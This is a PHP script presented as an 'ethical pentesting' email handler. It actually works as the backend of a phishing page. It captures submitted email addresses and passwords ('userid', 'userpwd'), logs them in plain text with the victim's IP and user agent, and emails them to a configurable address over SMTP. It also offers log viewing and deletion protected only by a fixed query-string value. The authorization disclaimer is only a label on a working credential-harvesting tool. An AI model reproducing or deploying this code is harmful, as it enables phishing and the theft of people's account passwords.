<?php
/**
 * SMTP Email Handler for Ethical Pentesting
 * Uses SMTP on port 25 for email functionality
 * 
 * IMPORTANT: This script is for authorized penetration testing only.
 * Ensure you have proper authorization before using this tool.
 */

// Configuration
$smtp_server = 'localhost'; // Change to your SMTP server
$smtp_port = 25;
$smtp_timeout = 30;

// Email configuration
$from_email = 'noreply@test.local';
$to_email = 'admin@test.local'; // Change to your email
$subject = 'Pentesting Form Submission Alert';

// Logging configuration
$log_file = 'pentest_log.txt';
$max_log_size = 5 * 1024 * 1024; // 5MB

/**
 * Simple SMTP client implementation
 */
class SimpleSMTP {
    private $socket;
    private $server;
    private $port;
    private $timeout;
    
    public function __construct($server, $port = 25, $timeout = 30) {
        $this->server = $server;
        $this->port = $port;
        $this->timeout = $timeout;
    }
    
    public function connect() {
        $this->socket = fsockopen($this->server, $this->port, $errno, $errstr, $this->timeout);
        if (!$this->socket) {
            throw new Exception("SMTP Connection failed: $errstr ($errno)");
        }
        
        // Read server greeting
        $response = fgets($this->socket, 512);
        if (substr($response, 0, 3) !== '220') {
            throw new Exception("SMTP Server not ready: $response");
        }
        
        return true;
    }
    
    public function sendCommand($command, $expected_code = '250') {
        fputs($this->socket, $command . "\r\n");
        $response = fgets($this->socket, 512);
        
        if (substr($response, 0, 3) !== $expected_code) {
            throw new Exception("SMTP Command failed: $command - Response: $response");
        }
        
        return $response;
    }
    
    public function sendEmail($from, $to, $subject, $message) {
        try {
            // HELO command
            $this->sendCommand("HELO " . gethostname());
            
            // MAIL FROM
            $this->sendCommand("MAIL FROM: <$from>");
            
            // RCPT TO
            $this->sendCommand("RCPT TO: <$to>");
            
            // DATA
            $this->sendCommand("DATA", '354');
            
            // Email headers and body
            $email_data = "From: $from\r\n";
            $email_data .= "To: $to\r\n";
            $email_data .= "Subject: $subject\r\n";
            $email_data .= "Date: " . date('r') . "\r\n";
            $email_data .= "Content-Type: text/html; charset=UTF-8\r\n";
            $email_data .= "\r\n";
            $email_data .= $message . "\r\n";
            $email_data .= ".";
            
            $this->sendCommand($email_data);
            
            return true;
            
        } catch (Exception $e) {
            throw $e;
        }
    }
    
    public function quit() {
        if ($this->socket) {
            fputs($this->socket, "QUIT\r\n");
            fclose($this->socket);
        }
    }
}

/**
 * Log data securely
 */
function logData($data) {
    global $log_file, $max_log_size;
    
    // Rotate log if too large
    if (file_exists($log_file) && filesize($log_file) > $max_log_size) {
        rename($log_file, $log_file . '.old');
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $log_entry = "[$timestamp] IP: $ip | User-Agent: $user_agent | Data: " . json_encode($data) . "\n";
    
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
}

/**
 * Sanitize input data
 */
function sanitizeInput($input) {
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}

/**
 * Validate email format
 */
function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Generate HTML email content
 */
function generateEmailContent($form_data) {
    $html = "<html><head><title>Pentesting Alert</title></head><body>";
    $html .= "<h2>Pentesting Form Submission Alert</h2>";
    $html .= "<p><strong>Timestamp:</strong> " . date('Y-m-d H:i:s') . "</p>";
    $html .= "<p><strong>IP Address:</strong> " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "</p>";
    $html .= "<p><strong>User Agent:</strong> " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "</p>";
    
    $html .= "<h3>Form Data:</h3>";
    $html .= "<table border='1' cellpadding='5' cellspacing='0'>";
    foreach ($form_data as $key => $value) {
        $html .= "<tr><td><strong>" . htmlspecialchars($key) . "</strong></td>";
        $html .= "<td>" . htmlspecialchars($value) . "</td></tr>";
    }
    $html .= "</table>";
    
    $html .= "<p><em>This is an automated message from the pentesting system.</em></p>";
    $html .= "</body></html>";
    
    return $html;
}

// Main processing logic
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        // Collect and sanitize form data
        $form_data = [];
        foreach ($_POST as $key => $value) {
            if ($key !== 'website') { // Skip honeypot field
                $form_data[sanitizeInput($key)] = sanitizeInput($value);
            }
        }
        
        // Check honeypot field (anti-bot measure)
        if (!empty($_POST['website'])) {
            // Likely a bot, log but don't process
            logData(['type' => 'bot_attempt', 'honeypot' => $_POST['website']]);
            http_response_code(400);
            exit('Invalid request');
        }
        
        // Validate required fields
        if (empty($form_data['userid']) || empty($form_data['userpwd'])) {
            throw new Exception('Required fields missing');
        }
        
        // Validate email format
        if (!validateEmail($form_data['userid'])) {
            throw new Exception('Invalid email format');
        }
        
        // Log the data
        logData($form_data);
        
        // Send email notification via SMTP
        try {
            $smtp = new SimpleSMTP($smtp_server, $smtp_port, $smtp_timeout);
            $smtp->connect();
            
            $email_content = generateEmailContent($form_data);
            $smtp->sendEmail($from_email, $to_email, $subject, $email_content);
            $smtp->quit();
            
            // Log successful email send
            logData(['type' => 'email_sent', 'to' => $to_email]);
            
        } catch (Exception $e) {
            // Log email failure but continue processing
            logData(['type' => 'email_failed', 'error' => $e->getMessage()]);
        }
        
        // Return success response
        http_response_code(200);
        echo json_encode(['status' => 'success', 'message' => 'Data processed']);
        
    } catch (Exception $e) {
        // Log error
        logData(['type' => 'error', 'message' => $e->getMessage()]);
        
        // Return error response
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Processing failed']);
    }
} else {
    // Handle GET requests or other methods
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}

// Optional: Display log contents for authorized users
if (isset($_GET['view_log']) && $_GET['view_log'] === 'authorized_access_only') {
    // Add additional authentication here in real scenarios
    if (file_exists($log_file)) {
        echo "<h2>Pentesting Log</h2>";
        echo "<pre>" . htmlspecialchars(file_get_contents($log_file)) . "</pre>";
    } else {
        echo "No log file found.";
    }
    exit;
}

// Optional: Clear logs for authorized users
if (isset($_GET['clear_log']) && $_GET['clear_log'] === 'authorized_access_only') {
    // Add additional authentication here in real scenarios
    if (file_exists($log_file)) {
        unlink($log_file);
        echo "Log cleared.";
    } else {
        echo "No log file to clear.";
    }
    exit;
}
?>